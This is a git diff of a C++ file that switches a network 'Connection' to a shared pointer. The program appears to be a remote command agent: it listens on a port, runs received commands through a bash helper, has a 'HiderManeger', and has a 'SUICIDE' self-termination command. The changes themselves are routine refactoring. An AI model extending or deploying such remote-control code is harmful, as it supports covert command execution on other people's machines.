@@ -1,5 +1,6 @@
 #include <iostream>
 #include <array>
+#include <memory>
 
 #include "SoftwareManeger.h"
 #include "../IncludeCPP/Status.h"
@@ -11,7 +12,7 @@
 
 #define PORT (65432)
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
+void loopIter(std::shared_ptr<Connection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
 void testSoftwareManeger(void);
 
 int main() {
@@ -23,7 +24,7 @@ int main() {
     bool cont = true;
     while (cont)
     {
-        Connection conn;
+        std::shared_ptr<Connection> conn;
         // TODO add error strtegy
         if (listener.acceptConnection(conn) == -1) {
             std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
@@ -55,13 +56,13 @@ std::string execBash(const char* cmd) {
 }
 
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
+void loopIter(std::shared_ptr<Connection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
 {
     // receive command
     Status res = DID_NOTHING;
     command cmd;
 
-    conn.recvCommand(cmd);
+    conn->recvCommand(cmd);
     std::string strParam = cmd.strParam;
     std::cout << "cmd.param: \n" << cmd.strParam;
 
@@ -87,7 +88,7 @@ void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger
         break;
     
     case SUICIDE:
-        conn.sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
+        conn->sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
         std::exit(EXIT_SUCCESS);
     
     }
@@ -98,5 +99,5 @@ void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger
     
     // TODO change such that there will be response only if we want it to be 
     std::cout << "Conn: res-" << res << " response-\n" << strRes << std::endl;
-    conn.sendResponce(res, strRes);
+    conn->sendResponce(res, strRes);
 }
